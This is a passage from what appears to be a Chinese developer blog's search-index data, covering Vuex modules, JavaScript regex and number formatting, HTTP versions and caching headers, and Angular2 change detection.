msg 属性：123const state = &#123; msg: 'hello world',&#125;; 然后我们在 getters 里面定义一个方法，返回这个 msg：123const getters = &#123; getMsg: state =&gt; state.msg,&#125;; 为了能够清楚的知道我们定义了什么 mutations 方法，我们可以在 mutation-types.js中定义方法名：12// mutation-types.jsexport const SET_MSG = 'SET_MSG'; 然后在 hello.js 导入这个文件：12345678// hello.jsimport * as type from '../mutation-types'...const mutations = &#123; [type.SET_MSG](state,msg)&#123; state.msg = msg; &#125;&#125;; 这种做法是基于 ES6的 对象可计算属性名最后我们用 axios 来进行异步操作，在 actions 里面定义一个方法：1234567891011const actions = &#123; changeMsg(&#123;commit&#125;)&#123; axios.get('http://127.0.0.1:8888') .then(res=&gt;&#123; commit([type.SET_MSG],res.data); &#125;) .catch(err=&gt;&#123; throw new Error(err); &#125;) &#125;&#125;; 这里我自己用 node 写了个小小的后端用来获取数据：12345678910111213// example.jsconst http = require('http');const hostname = '127.0.0.1';const port = '6666';const server = http.createServer((req,res)=&gt;&#123; res.statusCode = 200; res.setHeader('Content-Type','text/plain'); res.setHeader('Access-Control-Allow-Origin','*')// 解决跨域 res.write('你好') res.end();&#125;).listen(8888); 在命令行用 node example.js 就可以开启后端并监听 8888 端口。至此，我们的 hello.js 模块就完成了，让我们看一下完整的代码：1234567891011121314151617181920212223242526272829303132333435import * as type from '../mutation-types'import axios from 'axios';const state = &#123; msg: 'hello world',&#125;;const getters = &#123; getMsg: state =&gt; state.msg,&#125;;const mutations = &#123; [type.SET_MSG](state,msg)&#123; state.msg = msg; &#125;&#125;;const actions = &#123; changeMsg(&#123;commit&#125;)&#123; axios.get('http://127.0.0.1:8888') .then(res=&gt;&#123; commit(type.SET_MSG,res.data); &#125;) .catch(err=&gt;&#123; throw new Error(err); &#125;) &#125;&#125;;export default &#123; state, getters, mutations, actions&#125; 组件我们就在 vue-cli 生成的 HelloWorld.vue这个文件中，应用我们的 hello.js 模块 123456789101112131415161718192021222324252627// Hello&lt;template&gt; &lt;div&gt; &lt;h1&gt;我是HelloWorld组件&lt;/h1&gt; &lt;button @click=\"changeMsg\"&gt;改变Msg&lt;/button&gt; &lt;p&gt;目前Msg是:&#123;&#123;getMsg&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;mapGetters&#125; from 'vuex';import &#123;mapActions&#125; from 'vuex';export default &#123; name: 'HelloWorld', computed:&#123; ...mapGetters(['getMsg']) &#125;, methods:&#123; ...mapActions(['changeMsg']) &#125;,&#125;&lt;/script&gt;&lt;!-- Add \"scoped\" attribute to limit CSS to this component only --&gt;&lt;style lang=\"scss\" scoped &gt;&lt;/style&gt; 这里用到了两个辅助函数 mapGetters 和 mapActions，辅助函数将组件中的 getters 或 actions 映射为 store.commit 调用（需要在根节点注入 store）即直接使用函数如 &lt;p&gt;目前Msg是:&lt;/p&gt; 里面的 getMsg，否则我们就要多写几个字：&lt;p&gt;目前Msg是:&lt;/p&gt;。当然也有另外两个辅助行数 mapState 和 mapMutations，用法也都是一样的。而 ...mapGetters 前面的 ... 则是对象展开运算符，如果我们有多个 getters ，我们就可以这样写：123456computed:&#123; ...mapGetters([ 'getMsg', 'getAnotherMsg',// 其他的getter ]) &#125;, 最终效果 未点击按钮 点击按钮后 加载完成后从 getMsg 这个 getter 方法获取state的状态 msg 并显示在屏幕上，点击按钮后，触发函数 changeMsg 这个 action 方法请求本地数据并且提交 mutation 最终 SET_MSG 这个 mutation 方法将传入的数据赋值给 msg。","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://recallhyx.github.io/tags/vue/"}]},{"title":"JavaScript千位分隔符","slug":"JavaScript千位分隔符","date":"2018-03-28T02:45:38.000Z","updated":"2018-03-28T02:49:06.101Z","comments":true,"path":"2018/03/28/JavaScript千位分隔符/","link":"","permalink":"https://recallhyx.github.io/2018/03/28/JavaScript千位分隔符/","excerpt":"","text":"前言我们看一道题目 实现一个函数输入123456789，输出123，456，789 解法一，正则表达式str.replace(/(\\d)(?=(?:\\d{3})+$)/g,&#39;$1,&#39;)其中 (?:\\d{3}) 叫作非捕获括号，匹配 \\d{3} 但是不记住匹配项。然后它被正向肯定查找包裹住： (?=(?:\\d{3})+$)，(?=) 这就是正向肯定查找，会匹配到 \\d 仅仅当它后面跟着 (?:\\d{3})+$，且不会把 (?:\\d{3})+$ 当做匹配的内容。最后就是 $1, ，由于我们是用字符串的 replace 方法，它接受两个参数，第一个是正则表达式，第二个是替换的内容，而正则表达式由 () 匹配的内容，可以用 $1 来表示第一个 () 匹配的内容，所以替换后就是在匹配的数字后面加上 ,。整个流程就是，匹配数字（(\\d)），仅仅当这个数字后面（(?=)）有一个或多个三个数字的组合并以数字结尾（(?:\\d{3})+&amp;），匹配到就替换数字为原来的匹配项加上逗号。 解法二，toLocaleString()这个是字符串的方法，我一开始是用在转化时间为本地时间的，没想到还能用上千位分隔符。12var a = 123456789;a.toLocaleString();//\"123,456,789\" 解法三，new Intl.NumberFormat().format()这个函数能提供特定区域设置的数字格式，默认是 en-US。123var num = 123456789;new Intl.NumberFormat().format(num);//\"123,456,789\" 这个函数还能设置其他地区的数字的显示，具体可以参考 MDN","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript正则表达式","slug":"JavaScript正则表达式","date":"2018-03-26T06:54:02.000Z","updated":"2018-03-26T06:56:02.295Z","comments":true,"path":"2018/03/26/JavaScript正则表达式/","link":"","permalink":"https://recallhyx.github.io/2018/03/26/JavaScript正则表达式/","excerpt":"","text":"这里是对正则表达式的思考，源自一个题目： 完成一个 extractStr 函数，可以把一个字符串中所有的 : 到 . 的子串解析出来并且存放到一个数组当中，例如：extractStr(&#39;My name is:Jerry. My age is:12.&#39;) // =&gt; [&#39;Jerry&#39;, &#39;12&#39;]注意，: 和 . 之间不包含 : 和 .。也即是说，如果 ::abc..，则返回 [‘abc’]。 他给出的答案是1234const extractStr = (str) =&gt; &#123; const ret = str.match(/:([^:\\.])*?\\./g) || [] return ret.map((subStr) =&gt; subStr.replace(/[:\\.]/g, '')) &#125; 首先正则表达式匹配到的结果是[‘:Jerry.’,’:12.’]，然后再对数组进行操作，去掉 : 和 .。这样做不就多了一步了嘛，其实我们完全可以用正则来一步解决1234567const extractStr = (str) =&gt; &#123; const reg = /(?&lt;=:)(\\w*)(?=\\.)/g; const ret = str.match(reg) || [] return ret;&#125;var str = 'My name is:Jerry. My age is:12.'extractStr(str); 这样一步，就能得到我们的结果[&#39;Jerry&#39;,&#39;12&#39;]，而且有多余的 : 或者 . 也可以匹配到正确的结果。接下来解释一下这个正则表达式。/(?&lt;=:)(\\w*)(?=\\.)/g;我们先看大部分正则都有的部分(\\w*)，\\w*就是匹配任意字符串0个或多个，()的意思则是捕获，即记住这个捕获的内容。所以合起来就是匹配任意字符串0个或多个并且记住匹配项。然后是正则表达式 /.../g 后面的’g’，这是正则表达式标志： 标志 描述 g 全局搜索。 i 不区分大小写搜索。 m 多行搜索。 y 执行“粘性”搜索,匹配从目标字符串的当前位置开始，可以使用y标志。 使用 g 之后，不会因为匹配到一个匹配项就停下，而是继续搜索。接下来就是两个不常见的 (?&lt;=:)和 (?=\\.)首先解释一下名字 (?&lt;=:) 的意思是反向肯定查找，而(?=\\.)的意思就是正向肯定查找。我们分两部分，(?&lt;=:)(\\w*) 和 (\\w*)(?=\\.)。这样就清楚了，正向肯定查找会匹配到 Jerry 仅仅当它后面跟着 .，且不会把 . 当做匹配的内容。反向肯定查找会匹配到 Jerry 仅仅当它前面跟着:，且不会把 : 当做匹配的内容。两个结合起来就是，正则表达式会匹配到任意字符串仅仅当它的前面跟着 :，且仅仅当它后面跟着 . 注意：因为 . 在正则表达式里面代表除换行符之外的任何单个字符，所以需要转义才能匹配到 .，即 \\.","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"HTTP小结","slug":"HTTP小结","date":"2018-03-19T13:23:04.000Z","updated":"2018-04-23T12:15:28.842Z","comments":true,"path":"2018/03/19/HTTP小结/","link":"","permalink":"https://recallhyx.github.io/2018/03/19/HTTP小结/","excerpt":"","text":"前言主要是对比HTTP1.0，HTTP1.1 ，HTTPS，SPDY，HTTP2.0，还有对HTTP缓存的一些记录 HTTP1.0，HTTP1.1 ，HTTPS，SPDY，HTTP2.0HTTP1.0 与 HTTP1.1 区别HTTP1.0最早在网页中使用是在 1996 年，那个时候只是使用一些较为简单的网页上和网络请求上，而HTTP1.1则在 1999 年才开始广泛应用于现在的各大浏览器网络请求中，同时 HTTP1.1 也是当前使用最为广泛的HTTP协议。 主要区别主要体现在： 缓存处理，在HTTP1.0中主要使用header里的 If-Modified-Since , Expires 来做为缓存判断的标准，HTTP1.1 则引入了更多的缓存控制策略例如 Entity tag，If-Unmodified-Since , If-Match , If-None-Match 等更多可供选择的缓存头来控制缓存策略。 带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。 错误通知的管理，在HTTP1.1中新增了 24 个错误状态响应码，如 409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。 Host头处理，在 HTTP1.0 中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1 的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。 长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启 Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。 HTTP 与 HTTPS 的一些区别 HTTPS 协议需要到 CA 申请证书，一般免费证书很少，需要交费。 HTTP 协议运行在 TCP 之上，所有传输的内容都是明文，HTTPS 运行在 SSL/TLS 之上，SSL/TLS 运行在 TCP 之上，所有传输的内容都经过加密的。 HTTP 和 HTTPS 使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 HTTPS 可以有效的防止运营商劫持，解决了防劫持的一个大问题。 HTTP是 3 次握手建立连接，HTTPS的话则是 9 次握手 HTTPS 9次握手 (1) 客户端通过 Client Hello 消息将它支持的SSL版本、加密算法、密钥交换算法、MAC算法等信息发送给SSL服务器。 (2) 服务器确定本次通信采用的版本和加密套件，并通过 Server Hello 消息通知给客户端。如果服务器允许客户端在以后的通信中重用本次会话，则服务器会为本次会话分配会话ID，并通过 Server Hello 消息发送给SSL客户端。 (3) 服务器将携带自己公钥信息的数字证书通过 Certificate 消息发送给客户端。 (4) 服务器发送 Server Hello Done 消息，通知客户端版本和加密套件协商结束，开始进行密钥交换。 (5) 客户端验证服务器的证书合法后，利用证书中的公钥加密客户端随机生成的premaster secret，并通过 Client Key Exchange 消息发送给SSL服务器。 (6) 客户端发送 Change Cipher Spec 消息，通知服务器后续报文将采用协商好的密钥和加密套件进行加密和MAC计算。 (7) 客户端计算已交互的握手消息（除Change Cipher Spec消息外所有已交互的消息）的Hash值，利用协商好的密钥和加密套件处理Hash值（计算并添加MAC值、加密等），并通过 Finished 消息发送给服务器。服务器利用同样的方法计算已交互的握手消息的Hash值，并与 Finished 消息的解密结果比较，如果二者相同，且MAC值验证成功，则证明密钥和加密套件协商成功。 (8) 同样地，SSL服务器发送 Change Cipher Spec 消息，通知客户端后续报文将采用协商好的密钥和加密套件进行加密和MAC计算。 (9) 服务器计算已交互的握手消息的Hash值，利用协商好的密钥和加密套件处理Hash值（计算并添加MAC值、加密等），并通过 Finished 消息发送给客户端。客户端利用同样的方法计算已交互的握手消息的Hash值，并与 Finished 消息的解密结果比较，如果二者相同，且MAC值验证成功，则证明密钥和加密套件协商成功。 (10) 客户端接收到服务器发送的 Finished 消息后，如果解密成功，则可以判断服务器是数字证书的拥有者，即服务器身份验证成功，因为只有拥有私钥的服务器才能从Client Key Exchange消息中解密得到 premaster secret，从而间接地实现了客户端对服务器的身份验证。 HTTPS加密通信的流程HTTPS 相对于 HTTP 有哪些不同呢？其实就是在 HTTP 跟 TCP 中间加多了一层加密层 TLS/SSL。 将数据加密后再传输，而不是任由数据在复杂而又充满危险的网络上明文裸奔，在很大程度上确保了数据的安全。这样的话，即使数据被中间节点截获，坏人也看不懂。而且 HTTPS 不仅仅用非对称加密（加密数据用的密钥（公钥），跟解密数据用的密钥（私钥）是不一样的。通过公钥加密的数据，只能通过私钥解开。通过私钥加密的数据，只能通过公钥解开。），但同时也结合了其他手段，如对称加密（加密数据用的密钥，跟解密数据用的密钥是一样的），来确保授权、加密传输的效率、安全性。具体的流程就是： 小明访问网站A，网站A将自己的证书给到小明（其实是给到浏览器，小明不会有感知）。 浏览器从证书中拿到网站的公钥X。 浏览器生成一个只有自己自己的对称密钥Y，用公钥X加密，并传给网站A（其实是有协商的过程，这里为了便于理解先简化）。 网站A通过私钥解密，拿到对称密钥Y。 浏览器、网站A 之后的数据通信，都用对称密钥Y进行加密。 SPDY 与 HTTP2.0 的联系SPDY（发音如英语：speedy）可以说是综合了 HTTPS 和 HTTP 两者有点于一体的传输协议，主要解决： 降低延迟，针对 HTTP 高延迟的问题，SPDY 优雅的采取了多路复用（multiplexing）。多路复用通过多个请求stream共享一个 tcp 连接的方式，解决了HOL blocking 的问题，降低了延迟同时提高了带宽的利用率。 请求优先级（request prioritization）。多路复用带来一个新的问题是，在连接共享的基础之上有可能会导致关键请求被阻塞。SPDY 允许给每个 request 设置优先级，这样重要的请求就会优先得到响应。比如浏览器加载首页，首页的 html 内容应该优先展示，之后才是各种静态资源文件，脚本文件等加载，这样可以保证用户能第一时间看到网页内容。 header 压缩。前面提到 HTTP1.x 的 header 很多时候都是重复多余的。选择合适的压缩算法可以减小包的大小和数量。 基于 HTTPS 的加密协议传输，大大提高了传输数据的可靠性。 服务端推送（server push），采用了 SPDY 的网页，例如我的网页有一个sytle.css 的请求，在客户端收到 sytle.css 数据的同时，服务端会将 sytle.js 的文件推送给客户端，当客户端再次尝试获取 sytle.js 时就可以直接从缓存中获取到，不用再发请求了。 SPDY 位于 HTTP 之下，TCP 和 SSL 之上，这样可以轻松兼容老版本的 HTTP 协议（将HTTP1.x的内容封装成一种新的frame格式），同时可以使用已有的 SSL 功能。 后来 SPDY 未能单独成为正式标准，不过 SPDY 开发组的成员全程参与了HTTP/2的制定过程。HTTP/2 协议完成之后，Google认为 SPDY 可以功成身退了，于是最终Google Chrome 淘汰对 SPDY 的支持，全面改为采用 HTTP/2 。 HTTP2.0 可以说是 SPDY 的升级版（原本也是基于SPDY设计的），但是，HTTP2.0 跟 SPDY 仍有不同的地方，主要是以下两点： HTTP2.0 支持明文 HTTP 传输，而 SPDY 强制使用 HTTPS HTTP2.0 消息头的压缩算法采用 HPACK，而非 SPDY 采用的 DEFLATE HTTP2.0 新特性 新的二进制格式（Binary Format），HTTP1.x 的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑 HTTP2.0 的协议解析决定采用二进制格式，实现方便且健壮。 多路复用（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个 request 对应一个 id ，这样一个连接上可以有多个 request，每个连接的request 可以随机的混杂在一起，接收方可以根据 request 的 id 将 request 再归属到各自不同的服务端请求里面。 header 压缩，如上文中所言，对前面提到过 HTTP1.x 的header带有大量信息，而且每次都要重复发送，HTTP2.0 使用 encoder 来减少需要传输的 header 大小，通讯双方各自 cache 一份 header fields 表，既避免了重复 header 的传输，又减小了需要传输的大小。 服务端推送（server push），同SPDY一样，HTTP2.0 也具有server push功能。 完整图 HTTP缓存HTTP 头信息控制缓存大致分为两种：强缓存和协商缓存。强缓存如果命中缓存不需要和服务器端发生交互，而协商缓存不管是否命中都要和服务器端发生交互，强制缓存的优先级高于协商缓存。我们在上面说到，HTTP1.1 引入了更多的缓存控制策略，接下来我们详细讲一下这些缓存头。 缓存头 通用首部字段 请求首部字段 响应首部字段 实体首部字段 HTTP1.0 用到的缓存头Pragma当该字段值为 no-cache 的时候（事实上现在RFC中也仅标明该可选值），会知会客户端不要对该资源读缓存，即每次都得向服务器发一次请求才行。Pragma 属于通用首部字段，在客户端上使用时，常规要求我们往 html 上加上这段meta 元标签1&lt;meta http-equiv=\"Pragma\" content=\"no-cache\"&gt; Expires有了 Pragma 来禁用缓存，自然也需要有个东西来启用缓存和定义缓存时间，对http1.0 而言，Expires 就是做这件事的首部字段。 Expires 的值对应一个GMT（格林尼治时间），比如Mon, 22 Jul 2002 11:12:01 GMT来告诉浏览器资源缓存过期时间，如果还没过该时间点则不发请求。Expires 指缓存过期的时间，超过了这个时间点就代表资源过期。有一个问题是由于使用具体时间，如果时间表示出错或者没有转换到正确的时区都可能造成缓存生命周期出错。并且 Expires 是 HTTP/1.0 的标准，现在更倾向于用 HTTP/1.1 中定义的 Cache-Control。两个同时存在时也是 Cache-Control 的优先级更高。响应报文中 Expires 所定义的缓存时间是相对服务器上的时间而言的，如果客户端上的时间跟服务器上的时间不一致（特别是用户修改了自己电脑的系统时间），那缓存时间可能就没啥意义了。 Cache-Control针对上述的“ Expires 时间是相对服务器而言，无法保证和客户端时间统一”的问题，http1.1 新增了 Cache-Control 来定义缓存过期时间。注意：若报文中同时出现了 Expires 和 Cache-Control，则以 Cache-Control 为准。也就是说优先级从高到低分别是 Pragma -&gt; Cache-Control -&gt; Expires 。Cache-Control 也是一个通用首部字段，这意味着它能分别在请求报文和响应报文中使用。在RFC中规范了 Cache-Control 的格式为：&quot;Cache-Control&quot; &quot;:&quot; cache-directive其中，作为请求首部时，cache-directive 的可选值有： 作为响应首部时，cache-directive 的可选值有： Cache-Control 允许自由组合可选值，例如：Cache-Control: max-age=3600, must-revalidate 它意味着该资源是从原服务器上取得的，且其缓存（新鲜度）的有效时间为一小时，在后续一小时内，用户重新访问该资源则无须发送请求。 当然这种组合的方式也会有些限制，比如 no-cache 就不能和 max-age、min-fresh、max-stale 一起搭配使用。 以上，Expires 和 Cache-Control 都是属于强缓存，接下来介绍协商缓存 Last-modified服务器将资源传递给客户端时，会将资源最后更改的时间以“Last-Modified: GMT”的形式加在实体首部上一起返回给客户端。1Last-Modified: Fri, 22 Jul 2016 01:47:00 GMT 客户端会为资源标记上该信息，下次再次请求时，会把该信息附带在请求报文中一并带给服务器去做检查，若传递的时间值与服务器上该资源最终修改时间是一致的，则说明该资源没有被修改过，直接返回 304 状态码，内容为空，这样就节省了传输数据量 。如果两个时间不一致，则服务器会发回该资源并返回 200 状态码，和第一次请求时类似。这样保证不向客户端重复发出资源，也保证当服务器有变化时，客户端能够得到最新的资源。一个 304 响应比一个静态资源通常小得多，这样就节省了网络带宽。 至于传递标记起来的最终修改时间的请求报文首部字段一共有两个： If-Modified-Since: Last-Modified-value该请求首部告诉服务器如果客户端传来的最后修改时间与服务器上的一致，则直接回送304 和响应报头即可。当前各浏览器均是使用的该请求首部来向服务器传递保存的 Last-Modified 值。 If-Unmodified-Since: Last-Modified-value该值告诉服务器，若 Last-Modified 没有匹配上（资源在服务端的最后更新时间改变了），则应当返回412(Precondition Failed) 状态码给客户端。 Last-Modified 存在一定问题，如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为 Last-Modified 时间匹配不上而返回了整个实体给客户端（即使客户端缓存里有个一模一样的资源）。 注意：如果响应头中有 Last-modified 而没有 Expire 或 Cache-Control 时，浏览器会有自己的算法来推算出一个时间缓存该文件多久，不同浏览器得出的时间不一样，所以 Last-modified 要记得配合 Expires/Cache-Control 使用。 ETag为了解决上述Last-Modified可能存在的不准确的问题，Http1.1还推出了 ETag 实体首部字段。 服务器会通过某种算法，给资源计算得出一个唯一标志符（比如md5标志），在把资源响应给客户端的时候，会在实体首部加上“ETag: 唯一标识符”一起返回给客户端。例如：Etag: &quot;5d8c72a5edda8d6a:3239&quot;客户端会保留该 ETag 字段，并在下一次请求时将其一并带过去给服务器。服务器只需要比较客户端传来的ETag跟自己服务器上该资源的ETag是否一致，就能很好地判断资源相对客户端而言是否被修改过了。如果服务器发现ETag匹配不上，那么直接以常规GET 200回包形式将新的资源（当然也包括了新的ETag）发给客户端；如果ETag是一致的，则直接返回304知会客户端直接使用本地缓存即可。 那么客户端是如何把标记在资源上的 ETag 传回给服务器的呢？请求报文中有两个首部字段可以带上 ETag 值： If-None-Match: ETag-value告诉服务端如果 ETag 没匹配上需要重发资源数据，否则直接回送304 和响应报头即可。 当前各浏览器均是使用的该请求首部来向服务器传递保存的 ETag 值。 If-Match: ETag-value告诉服务器如果没有匹配到 ETag，或者收到了“*”值而当前并没有该资源实体，则应当返回412(Precondition Failed) 状态码给客户端。否则服务器直接忽略该字段。需要注意的是，如果资源是走分布式服务器（比如 CDN）存储的情况，需要这些服务器上计算 ETag 唯一值的算法保持一致，才不会导致明明同一个文件，在服务器A和服务器B上生成的 ETag 却不一样。 缓存头部对比 头部 优势和特点 劣势和问题 Expires 1、HTTP 1.0 产物，可以在HTTP 1.0和1.1中使用，简单易用。2、以时刻标识失效时间。 1、时间是由服务器发送的(UTC)，如果服务器时间和客户端时间存在不一致，可能会出现问题。2、存在版本问题，到期之前的修改客户端是不可知的。 Cache-Control 1、HTTP 1.1 产物，以时间间隔标识失效时间，解决了Expires服务器和客户端相对时间的问题。2、比Expires多了很多选项设置。 1、HTTP 1.1 才有的内容，不适用于HTTP 1.0 。2、存在版本问题，到期之前的修改客户端是不可知的。 Last-Modified 1、不存在版本问题，每次请求都会去服务器进行校验。服务器对比最后修改时间如果相同则返回304，不同返回200以及资源内容。 1、只要资源修改，无论内容是否发生实质性的变化，都会将该资源返回客户端。例如周期性重写，这种情况下该资源包含的数据实际上一样的。2、以时刻作为标识，无法识别一秒内进行多次修改的情况。3、某些服务器不能精确的得到文件的最后修改时间。 ETag 1、可以更加精确的判断资源是否被修改，可以识别一秒内多次修改的情况。2、不存在版本问题，每次请求都回去服务器进行校验。 1、计算ETag值需要性能损耗。2、分布式服务器存储的情况下，计算ETag的算法如果不一样，会导致浏览器从一台服务器上获得页面内容后到另外一台服务器上进行验证时发现ETag不匹配的情况。 用户刷新/访问行为我们可以把刷新/访问界面的手段分成三类： 在URI输入栏中输入然后回车/通过书签访问 F5/点击工具栏中的刷新按钮/右键菜单重新加载 Ctrl+F5 在浏览器中，有时候你会发现通过不同的手段访问/刷新界面页面的呈现速度是不一样的，那么它们到底有什么区别呢?以下对这三种访问情况进行实践与讨论。准备工作：为了模拟第一次访问某网站，清除相关缓存内容。首次访问网页，查看请求与响应信息可以看到请求头部没有任何关于 http 缓存相关的信息。而返回的 HTTPresponse 包含了以下头部信息。123Cache-Control: max-age=31104000Expires: Thu, 20 Jul 2017 02:18:41 GMTLast-Modified: Fri, 15 Jul 2016 04:11:51 GMT 浏览器会对该文件进行缓存，直到该文件过期、用户清空cache或者用户强制刷新资源时间。 在URI输入栏中输入然后回车我们可以看到返回响应码是 200 OK (from cache)，浏览器发现该资源已经缓存了而且没有过期（通过Expires头部或者Cache-Control头部），没有跟服务器确认，而是直接使用了浏览器缓存的内容。其中响应内容和之前的响应内容一模一样，例如其中的Date时间是上一次响应的时间。 所以我们也能看到该资源的Size为 from cache F5/点击工具栏中的刷新按钮/右键菜单重新加载F5的作用和直接在 URI 输入栏中输入然后回车是不一样的，F5会让浏览器无论如何都发一个 HTTP Request 给Server，即使先前的响应中有Expires头部。所以，当我在当前 网页中按F5的时候，浏览器会发送一个HTTP Request给Server，但是包含这样的Headers:12Cache-Control: max-age=0If-Modified-Since: Fri, 15 Jul 2016 04:11:51 GMT 其中Cache-Control是Chrome强制加上的，而If-Modified-Since是因为获取该资源的时候包含了Last-Modified头部，浏览器会使用If-Modified-Since头部信息重新发送该时间以确认资源是否需要重新发送。 实际上Server没有修改这个index.css文件，所以返回了一个304(Not Modified)，这样的响应信息很小，所消耗的route-trip不多，网页很快就刷新了。 上面的例子中没有ETag，如果Response中包含ETag，F5引发的 Http Request 中也是会包含 If-None-Match 的。 Ctrl+F5那么Ctrl+F5呢？ Ctrl+F5 也叫强制刷新，要的是彻底的从Server拿一份新的资源过来，所以不光要发送 HTTP request 给Server，而且这个请求里面连 If-Modified-Since/If-None-Match 都没有，这样就逼着 Server 不能返回304，而是把整个资源原原本本地返回一份，这样，Ctrl+F5 引发的传输时间变长了，自然网页 Refresh 的也慢一些。我们可以看到该操作返回了200，并刷新了相关的缓存控制时间。 实际上，为了保证拿到的是从Server上最新的，Ctrl+F5不只是去掉了If-Modified-Since/If-None-Match，还需要添加一些HTTP Headers。按照HTTP/1.1协议，Cache不光只是存在Browser终端，从Browser到Server之间的中间节点(比如Proxy)也可能扮演Cache的作用，为了防止获得的只是这些中间节点的Cache，需要告诉他们，别用自己的Cache敷衍我，往Upstream的节点要一个最新的copy吧。在Chrome 51 中会包含两个头部信息， 作用就是让中间的Cache对这个请求失效，这样返回的绝对是新鲜的资源。12Cache-Control: no-cachePragma: no-cache 总结 参考：HTTP1.0、HTTP1.1 和 HTTP2.0 的区别HTTP,HTTP2.0,SPDY,HTTPS你应该知道的一些事http的变迁（http1.0-http2.0，https）SPDYHTTP 缓存机制一二三HTTP缓存控制小结浅谈浏览器http的缓存机制HTTPS科普扫盲帖","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://recallhyx.github.io/categories/HTTP/"}],"tags":[{"name":"http","slug":"http","permalink":"https://recallhyx.github.io/tags/http/"}]},{"title":"前端三大框架数据流动和原理","slug":"前端三大框架数据流动和原理","date":"2018-03-18T14:02:26.000Z","updated":"2018-03-19T02:16:47.176Z","comments":true,"path":"2018/03/18/前端三大框架数据流动和原理/","link":"","permalink":"https://recallhyx.github.io/2018/03/18/前端三大框架数据流动和原理/","excerpt":"","text":"前言前端三大框架：Angular2、React、Vue，都是 MVVM 框架，但是他们各自实现 ViewModel 层 数据绑定的方式都不太一样，在我学习框架的过程中，也想要知道底层实现的方法，所以写写博客记录一下。 Angular2Angular2 提供一种特殊的双向数据绑定语法：[(x)]。 [(x)] 语法结合了属性绑定的方括号 [x] 和事件绑定的圆括号 (x) 。也就是说，Angular2 数据流向是单向的。 注：这里不讨论 Angularjs 和 Angular2 的区别，因为 Angular2 几乎是 Angularjs 的大改，很多地方都不一样了，具体可以自己去找找。 怎么知道数据变化了我们知道有一些操作会引起数据的变化 用户输入操作，比如点击，提交等 请求服务端数据 定时事件，比如 setTimeout，setInterval 这几点有一个共同点，就是它们都是异步的。也就是说，所有的异步操作是可能导致数据变化的根源因素。Angular2 引入了一个很重要的文件 zone.js（所谓的猴子补丁Monkey patch），它主要是对异步事件做一层代理包裹，也就是说 Zone.js 运行后，调用 setTimeout、addEventListener 等浏览器异步事件时，不再是调用原生的方法，而是被猴子补丁包装过后的代理方法。这里就用到了一个模式：代理模式 下面我们来介绍 ngZone 。实际上，ngZone 是基于 Zone.js 来实现的，Angular2 fork了 zone.js，它是 zone 派生出来的一个子zone，在 Angular 环境内注册的异步事件都运行在这个 子zone 上(因为 ngZone 拥有整个 Angular 运行环境的执行上下文)，并且 onTurnStart 和 onTurnDone 事件也会在该 子zone 的 run 方法中触发。 在Angular2源码中，有一个 ApplicationRef 类，其作用是用来监听 ngZone 中的 onTurnDone 事件，不论何时只要触发这个事件，那么将会执行一个 tick() 方法用来告诉 Angular 去执行变化监测。1234567891011121314// very simplified version of actual sourceclass ApplicationRef &#123; changeDetectorRefs:ChangeDetectorRef[] = []; constructor(private zone: NgZone) &#123; this.zone.onTurnDone .subscribe(() =&gt; this.zone.run(() =&gt; this.tick()); &#125; tick() &#123; this.changeDetectorRefs .forEach((ref) =&gt; ref.detectChanges()); &#125;&#125; 数据更新Angular2 有一个机制：脏检查，其实就是存储所有变量的值，每当可能有变量发生变化需要检查时，就将所有变量的旧值跟新值进行比较，不相等就说明检测到变化，需要更新对应视图。在 Angular2 中，任何的一个 Angular2 应用都是由大大小小的组件组成的，可以把它看成是一颗线性的组件树，重要的是，每一个组件都有自己的变化检测器。正是因为每个组件都拥有它的变化检测器，组成了 Angular2 应用的一颗组件树，同样的我们也有变化监测树，它也是线性的，数据的流向也是从上到下，因为变化监测在每个组件中的执行也是从根组件开始，从上往下的执行。 Angular2 在整个运行期间都会为每一个组件创建监测类，用来监测每个组件在每个运行周期是否有异步操作发生。当变化监测被执行时，即发生了异步操作，那么这个组件的值被传递到对应组件的变化检测器来和之前的数据对比是否有改变，如果和参照数据对比有变动的话，Angular 将更新视图。 优化变化检测策略因为在JavaScript语言中不提供给我们对象的变化通知，所以 Angular 必须保守的要对每一个组件的每一次运行结果执行变化检测，但其实很多组件的输入属性是没有变化的，没必要对这样的组件来一次变化监测，如何减少不必要的监测，我们有两种 OnPush 方式去实现。1234export enum ChangeDetectionStrategy &#123; OnPush, // 表示变化检测对象的状态为`CheckOnce` Default, // 表示变化检测对象的状态为`CheckAlways`&#125; 从 ChangeDetectionStrategy 可以看到，Angular2 有两种变化检测策略。Default 是 Angular2 